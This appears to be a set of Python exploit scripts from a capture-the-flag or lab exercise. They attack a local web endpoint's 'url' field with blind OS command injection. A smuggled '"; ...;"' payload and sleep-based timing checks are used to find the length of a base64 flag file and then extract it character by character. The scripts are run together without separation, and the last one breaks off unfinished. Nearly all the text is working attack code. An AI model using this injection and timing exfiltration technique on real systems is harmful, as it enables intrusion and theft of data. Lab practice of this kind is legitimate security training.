import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

def send_payload(payload_cmd, timeout=10):
    """Send payload and measure response time"""
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=timeout)
        elapsed = time.time() - start_time
        return elapsed, response.status_code
    except requests.Timeout:
        elapsed = timeout
        return elapsed, None
    except Exception as e:
        elapsed = time.time() - start_time
        return elapsed, None

# First verify file exists
print("[*] Verifying /tmp/flag.b64 exists...")
payload = "[ -f /tmp/flag.b64 ] && sleep 2"
elapsed, status = send_payload(payload)
print(f"    File exists check: {elapsed:.2f}s (should show ~2s if exists)")

# Try a wider range of lengths - base64 length is typically 4/3 of original
# Let's check from 0 to 200 in smaller steps
print("\n[*] Searching for flag length (0-100)...")

flag_len = -1
for test_len in range(0, 101, 1):
    payload = f'[ $(cat /tmp/flag.b64 2>/dev/null | wc -c) -eq {test_len} ] && sleep 2'
    elapsed, status = send_payload(payload)
    if elapsed > 1.5:
        flag_len = test_len
        print(f"[+] Length FOUND: {test_len} characters (time: {elapsed:.2f}s)")
        break
    if test_len % 10 == 0:
        print(f"    Checked up to {test_len}...")

if flag_len == -1:
    print("[-] Length not found in range 0-100, trying 100-200...")
    for test_len in range(100, 201, 1):
        payload = f'[ $(cat /tmp/flag.b64 2>/dev/null | wc -c) -eq {test_len} ] && sleep 2'
        elapsed, status = send_payload(payload)
        if elapsed > 1.5:
            flag_len = test_len
            print(f"[+] Length FOUND: {test_len} characters (time: {elapsed:.2f}s)")
            break
        if test_len % 20 == 0:
            print(f"    Checked up to {test_len}...")

print(f"\n[*] Flag length: {flag_len}")
import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

# Base64 characters: A-Z, a-z, 0-9, +, /, =
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd, timeout=10):
    """Send payload and measure response time"""
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=timeout)
        elapsed = time.time() - start_time
        return elapsed
    except requests.Timeout:
        elapsed = timeout
        return elapsed
    except Exception as e:
        elapsed = time.time() - start_time
        return elapsed

def get_char_at_position(pos):
    """Extract character at position using time-based comparison"""
    for char in CHARSET:
        # Use bash comparison 
        # Using proper quoting for the character
        if char == '"':
            continue  # Skip double quote to avoid breaking payload
        
        # Payload: extract character and compare, sleep if matches
        payload_cmd = f'[ "$(cat /tmp/flag.b64 | cut -c{pos})" = "{char}" ] && sleep 2'
        elapsed = send_payload(payload_cmd)
        
        if elapsed > 1.5:
            print(f"    Position {pos}: '{char}' (time: {elapsed:.2f}s)")
            return char
    
    return None

print("[*] Starting character extraction (length: 98)")
print(f"[*] Charset: {CHARSET}")
print("[*] This may take several minutes...")

flag_chars = []

for pos in range(1, 99):  # Positions 1 to 98
    char = get_char_at_position(pos)
    if char:
        flag_chars.append(char)
        # Print progress every 10 chars
        if pos % 10 == 0 or pos < 10:
            print(f"[+] Progress: {''.join(flag_chars)}")
    else:
        print(f"[!] Could not determine character at position {pos}")
        flag_chars.append('?')

print("\n" + "="*60)
print("[*] Extraction complete!")
print(f"[*] Encoded flag: {''.join(flag_chars)}")
print("="*60)
import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"

# Base64 characters: A-Z, a-z, 0-9, +, /, =
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd, timeout=5):
    """Send payload and measure response time"""
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=timeout)
        elapsed = time.time() - start_time
        return elapsed
    except:
        return 5

def get_char_at_position(pos, timeout=3.5):
    """Extract single character using shorter sleep for speed"""
    for char in CHARSET:
        if char == '"' or char == "'":
            continue
        
        # Using single character sleep (1 second instead of 2)
        payload_cmd = f'[ "$(cat /tmp/flag.b64 | cut -c{pos})" = "{char}" ] && sleep 1'
        elapsed = send_payload(payload_cmd, timeout=timeout)
        
        if elapsed > 0.8:  # Threshold for 1 second sleep
            return char
    return None

print("[*] Starting character extraction (length: 98)")
print("[*] Using 1 second timing threshold for faster extraction")
print("[*] Estimated time: ~10-15 minutes\n")

flag_chars = []
start_time = time.time()

for pos in range(1, 99):
    char = get_char_at_position(pos)
    if char:
        flag_chars.append(char)
        elapsed_so_far = time.time() - start_time
        print(f"    [{pos}/98] Position {pos}: '{char}' - Progress: {''.join(flag_chars)[-20:]}")
    else:
        print(f"    [{pos}/98] Position {pos}: FAILED - setting as '?'")
        flag_chars.append('?')

total_time = time.time() - start_time
encoded_flag = ''.join(flag_chars)

print("\n" + "="*60)
print(f"[*] Extraction complete in {total_time:.1f} seconds!")
print(f"[*] Encoded flag: {encoded_flag}")
print("="*60)
import requests
import time

TARGET_URL = "http://127.0.0.1:32998/add_url"
CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def send_payload(payload_cmd):
    payload = f'"; {payload_cmd};"'
    data = {'url': payload}
    
    start = time.time()
    try:
        r = requests.post(TARGET_URL, data=data, timeout=10)
        return time.time() - start
    except:
        return 10

def extract_char(pos):
    for c in CHARSET:
        if c in '"\'':
            continue
        cmd = f'[ "$(cat /tmp/flag.b64 | cut -c{pos})" = "{c}" ] && sleep 1'
        elapsed = send_payload(cmd)
        if elapsed > 0.7:
            return c
    return '?'

